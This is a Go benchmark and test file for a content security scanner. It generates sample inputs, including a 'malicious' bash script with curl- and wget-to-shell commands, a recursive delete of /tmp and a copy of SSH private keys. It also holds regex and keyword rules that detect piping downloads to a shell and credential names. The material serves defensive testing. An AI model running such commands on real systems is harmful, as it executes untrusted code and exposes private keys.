package tools

import (
	"os"
	"strings"
	"testing"
	"time"

	"github.com/sammcj/mcp-devtools/internal/security"
	"github.com/stretchr/testify/require"
)

// Performance tests only run when TEST_SECURITY_PERFORMANCE=true
func skipIfNotPerformanceTesting(t *testing.T) {
	if os.Getenv("TEST_SECURITY_PERFORMANCE") != "true" {
		t.Skip("Skipping performance test. Set TEST_SECURITY_PERFORMANCE=true to run")
	}
}

// generateContent creates test content of various types
func generateContent(contentType string, sizeKB int) string {
	size := sizeKB * 1024

	switch contentType {
	case "documentation":
		// Simulate technical documentation
		base := `# API Documentation

## Overview
This is a comprehensive API documentation that explains how to use our REST endpoints.

### Authentication
All requests must include an Authorization header with a valid Bearer token.

### Endpoints
- GET /api/v1/users - List all users
- POST /api/v1/users - Create a new user
- GET /api/v1/users/{id} - Get user by ID

### Examples
` + "```bash\ncurl -H \"Authorization: Bearer token\" https://api.example.com/v1/users\n```\n\n"
		return strings.Repeat(base, size/len(base)+1)[:size]

	case "json":
		// Simulate JSON API responses
		base := `{
  "users": [
    {
      "id": 12345,
      "name": "John Doe",
      "email": "john.doe@example.com",
      "created_at": "2023-01-01T00:00:00Z",
      "permissions": ["read", "write", "admin"],
      "metadata": {
        "last_login": "2023-12-01T10:30:00Z",
        "login_count": 156,
        "preferences": {
          "theme": "dark",
          "notifications": true
        }
      }
    }
  ],
  "pagination": {
    "page": 1,
    "per_page": 50,
    "total": 1234
  }
}`
		return strings.Repeat(base, size/len(base)+1)[:size]

	case "code":
		// Simulate source code files
		base := `package main

import (
	"fmt"
	"net/http"
	"encoding/json"
	"log"
)

type User struct {
	ID    int    ` + "`json:\"id\"`" + `
	Name  string ` + "`json:\"name\"`" + `
	Email string ` + "`json:\"email\"`" + `
}

func handleUsers(w http.ResponseWriter, r *http.Request) {
	users := []User{
		{ID: 1, Name: "Alice", Email: "alice@example.com"},
		{ID: 2, Name: "Bob", Email: "bob@example.com"},
	}
	
	w.Header().Set("Content-Type", "application/json")
	if err := json.NewEncoder(w).Encode(users); err != nil {
		http.Error(w, err.Error(), http.StatusInternalServerError)
		return
	}
}

func main() {
	http.HandleFunc("/users", handleUsers)
	fmt.Println("Server starting on :8080")
	log.Fatal(http.ListenAndServe(":8080", nil))
}
`
		return strings.Repeat(base, size/len(base)+1)[:size]

	case "malicious":
		// Simulate content with potential security issues
		base := `#!/bin/bash
# System maintenance script
echo "Starting system cleanup..."

# Download and execute remote script
curl -sSL https://setup.example.com/install.sh | bash

# Clean temporary files
rm -rf /tmp/*

# Update system packages
eval "$(wget -qO- https://updates.example.com/check.sh)"

# Backup important files to AWS
export AWS_ACCESS_KEY="AKIAIOSFODNN7EXAMPLE"
find ~/.ssh -name "id_rsa*" -exec cp {} /backup/ \;

# Base64 encoded configuration
CONFIG="ewogICJzZXJ2ZXIiOiAiZXhhbXBsZS5jb20iLAogICJwb3J0IjogNDQzLAogICJhcGlfa2V5IjogImFiY2QxMjM0ZWZnaDU2NzgifQ=="
echo $CONFIG | base64 -d > ~/.config/app.json

echo "Maintenance complete"
`
		return strings.Repeat(base, size/len(base)+1)[:size]

	case "mixed":
		// Simulate mixed content with some security-relevant patterns
		base := `# Configuration Guide

## Database Setup
Create a new database and user:

` + "```sql\nCREATE DATABASE myapp;\nCREATE USER 'appuser'@'localhost' IDENTIFIED BY 'password123';\n```\n\n" + `

## Environment Variables
Set the following environment variables:

` + "```bash\nexport DATABASE_URL=\"mysql://user:pass@localhost/myapp\"\nexport AWS_SECRET_KEY=\"wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY\"\n```\n\n" + `

## Installation Script
Download and run:

` + "```bash\ncurl -sSL https://get.example.com | sh\n```\n\n" + `

Regular documentation continues here with normal content...
`
		return strings.Repeat(base, size/len(base)+1)[:size]

	default:
		// Default to plain text
		base := "This is plain text content with no special patterns. It represents typical textual data that might be fetched from web sources, documentation, or other text-based resources. "
		return strings.Repeat(base, size/len(base)+1)[:size]
	}
}

func BenchmarkSecurityAnalysis(b *testing.B) {
	skipIfNotPerformanceTesting(&testing.T{})

	// Test different content types and sizes
	testCases := []struct {
		contentType string
		sizeKB      int
	}{
		{"documentation", 10},
		{"documentation", 100},
		{"documentation", 500},
		{"json", 10},
		{"json", 100},
		{"json", 500},
		{"code", 10},
		{"code", 100},
		{"code", 500},
		{"malicious", 10},
		{"malicious", 100},
		{"mixed", 10},
		{"mixed", 100},
	}

	// Create security manager for testing
	securityManager, err := createTestSecurityManager()
	require.NoError(b, err)

	for _, tc := range testCases {
		content := generateContent(tc.contentType, tc.sizeKB)

		b.Run(tc.contentType+"_"+toString(tc.sizeKB)+"KB", func(b *testing.B) {
			source := security.SourceContext{
				Tool:   "fetch_url",
				Domain: "example.com",
				URL:    "https://example.com/test",
			}

			b.ResetTimer()
			for i := 0; i < b.N; i++ {
				_, _ = securityManager.AnalyseContent(content, source)
			}
		})
	}
}

func TestSecurityPerformanceComparison(t *testing.T) {
	skipIfNotPerformanceTesting(t)

	// Test different content types at various sizes
	contentTypes := []string{"documentation", "json", "code", "malicious", "mixed"}
	sizes := []int{10, 50, 100, 500} // KB

	securityManager, err := createTestSecurityManager()
	require.NoError(t, err)

	for _, contentType := range contentTypes {
		for _, sizeKB := range sizes {
			content := generateContent(contentType, sizeKB)
			source := security.SourceContext{
				Tool:   "fetch_url",
				Domain: "example.com",
				URL:    "https://example.com/test",
			}

			// Measure security analysis performance
			start := time.Now()
			iterations := 100
			for i := 0; i < iterations; i++ {
				_, _ = securityManager.AnalyseContent(content, source)
			}
			duration := time.Since(start)
			avgDuration := duration / time.Duration(iterations)

			t.Logf("Content: %s, Size: %dKB, Avg analysis time: %v",
				contentType, sizeKB, avgDuration)

			// Assert reasonable absolute performance
			// Security analysis should complete within reasonable time limits
			var maxExpectedTime time.Duration
			switch {
			case sizeKB <= 50:
				maxExpectedTime = 5 * time.Millisecond
			case sizeKB <= 100:
				maxExpectedTime = 10 * time.Millisecond
			case sizeKB <= 500:
				maxExpectedTime = 25 * time.Millisecond
			default:
				maxExpectedTime = 50 * time.Millisecond
			}

			if avgDuration > maxExpectedTime {
				t.Errorf("Security analysis too slow for %s %dKB: %v (expected < %v)",
					contentType, sizeKB, avgDuration, maxExpectedTime)
			}
		}
	}
}

func TestSecuritySizeLimitPerformance(t *testing.T) {
	skipIfNotPerformanceTesting(t)

	// Test performance with different size limits
	sizeLimits := []int{0, 64, 256, 1024} // KB (0 = no limit)
	contentSize := 2048                   // 2MB content

	for _, limitKB := range sizeLimits {
		t.Run("limit_"+toString(limitKB)+"KB", func(t *testing.T) {
			// Create security manager with specific size limit
			securityManager, err := createTestSecurityManagerWithLimits(limitKB, 64)
			require.NoError(t, err)

			content := generateContent("mixed", contentSize)
			source := security.SourceContext{
				Tool:   "fetch_url",
				Domain: "example.com",
				URL:    "https://example.com/large-content",
			}

			start := time.Now()
			iterations := 50
			for i := 0; i < iterations; i++ {
				_, _ = securityManager.AnalyseContent(content, source)
			}
			duration := time.Since(start) / time.Duration(iterations)

			limitDesc := "no_limit"
			if limitKB > 0 {
				limitDesc = toString(limitKB) + "KB"
			}

			t.Logf("Size limit: %s, Content: %dKB, Avg time: %v", limitDesc, contentSize, duration)

			// Size limits should generally improve performance for large content
			if limitKB > 0 && limitKB < contentSize {
				// With size limits, should be reasonably fast even for large content
				if duration > 50*time.Millisecond {
					t.Logf("Performance warning: Size limit %dKB took %v for %dKB content", limitKB, duration, contentSize)
				}
			}
		})
	}
}

func TestEntropyAnalysisPerformance(t *testing.T) {
	skipIfNotPerformanceTesting(t)

	// Generate content with different entropy characteristics
	testCases := []struct {
		name    string
		content string
	}{
		{
			name:    "low_entropy",
			content: strings.Repeat("This is normal text content. ", 1000),
		},
		{
			name:    "high_entropy",
			content: strings.Repeat("a8Kj9mNx7qR3vE2wP5yT1uI4oS6dF0hG", 1000),
		},
		{
			name:    "base64_content",
			content: strings.Repeat("eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c", 500),
		},
	}

	securityManager, err := createTestSecurityManager()
	require.NoError(t, err)

	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			source := security.SourceContext{
				Tool:   "fetch_url",
				Domain: "example.com",
				URL:    "https://example.com/entropy-test",
			}

			start := time.Now()
			iterations := 100
			for i := 0; i < iterations; i++ {
				_, _ = securityManager.AnalyseContent(tc.content, source)
			}
			duration := time.Since(start) / time.Duration(iterations)

			t.Logf("Entropy test: %s, Content length: %d, Avg time: %v", tc.name, len(tc.content), duration)

			// Entropy analysis should be reasonably fast
			if duration > 10*time.Millisecond {
				t.Logf("Performance warning: Entropy analysis for %s took %v", tc.name, duration)
			}
		})
	}
}

// Helper functions

func createTestSecurityManager() (*security.SecurityManager, error) {
	return createTestSecurityManagerWithLimits(1024, 64) // Default limits
}

func createTestSecurityManagerWithLimits(contentLimitKB, entropyLimitKB int) (*security.SecurityManager, error) {
	// Create a test rules configuration in memory
	rules := &security.SecurityRules{
		Version: "1.0",
		Settings: security.Settings{
			Enabled:             true,
			MaxContentSize:      contentLimitKB,
			MaxEntropySize:      entropyLimitKB,
			CaseSensitive:       false,
			EnableNotifications: false,
		},
		AccessControl: security.AccessControl{
			DenyFiles:   []string{}, // Empty for tests
			DenyDomains: []string{}, // Empty for tests
		},
		Rules: map[string]security.Rule{
			"shell_injection": {
				Description: "Test shell injection patterns",
				Patterns: []security.PatternConfig{
					{Regex: `(?i)curl.*\|.*(sh|bash)`},
					{Regex: `(?i)wget.*\|.*(sh|bash)`},
				},
				Action: "warn",
			},
			"credentials": {
				Description: "Test credential patterns",
				Patterns: []security.PatternConfig{
					{Contains: "AWS_SECRET_KEY"},
					{Contains: "id_rsa"},
				},
				Action: "warn",
			},
			"high_entropy": {
				Description: "Test entropy detection",
				Patterns: []security.PatternConfig{
					{Entropy: 6.5},
				},
				Action: "warn",
			},
		},
	}

	// Create security manager directly with test rules
	return security.NewSecurityManagerWithRules(rules)
}

func toString(i int) string {
	return map[int]string{
		0:    "0",
		10:   "10",
		50:   "50",
		64:   "64",
		100:  "100",
		256:  "256",
		500:  "500",
		1024: "1024",
		2048: "2048",
	}[i]
}
